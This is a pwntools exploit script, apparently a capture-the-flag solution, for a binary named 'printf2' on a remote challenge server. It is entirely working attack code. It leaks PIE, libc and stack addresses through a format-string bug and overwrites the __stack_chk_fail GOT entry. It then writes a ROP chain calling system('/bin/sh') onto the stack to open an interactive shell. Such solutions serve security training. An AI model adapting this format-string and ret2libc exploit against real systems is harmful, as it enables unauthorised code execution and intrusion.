#!/usr/bin/env python3

from pwn import *

exe = ELF("./printf2_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal= ['alacritty','-e','bash','-c']


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("pwn.blitzhack.xyz",3333)
        context.noptrace=True

    return r


def main():
    r = conn()
    r.recvuntil(b'this:')
    exe.address =  int(r.recvline().strip(),16) -exe.sym.main
    log.info(f'pie : {hex(exe.address)}')
    off = 8
    r.sendlineafter(b'>',b'24')
    #idx 82 ->  idx 112  off = -0x360
    sz = exe.sym.main & 0xffff
    sz -=34
    pl = b'.%77$p.%73$p.aaa'+f'%{sz}c%14$hnaa'.encode()+b'%2c%73$hnaaaaaaaa'+p64(exe.got['__stack_chk_fail'])
    print(pl)
    r.sendlineafter(b'>',pl)
    l = r.recvuntil(b'aaaaaa')
    print(l)
    libc.address = int(l.split(b".")[1],16) -0x29d90
    stack = int(l.split(b".")[2],16)
    log.info(f"libc : {hex(libc.address)}")
    log.info(f"stack : {hex(stack)}")
    pop_rdi =  libc.address+0x2a3e5
    ret = pop_rdi+1
    binsh = next(libc.search(b'/bin/sh'))
    #one_gad = libc.address + 0x583e3
    #pop_rbx = libc.address+0xef52b
    stk = exe.got['__stack_chk_fail']
    rip = stack-0x470
    log.info(f"the rip :{hex(rip)}")
    write = { rip:pop_rdi,rip+8:binsh,rip+16:ret,rip+24:libc.sym.system}
   
    pl = fmtstr_payload(8,write)
    print(len(pl))
    sleep(1)
    r.sendlineafter(b'>',b'24')
    gdb.attach(r)
    r.sendlineafter(b'>',pl)
    r.interactive()


if __name__ == "__main__":
    main()
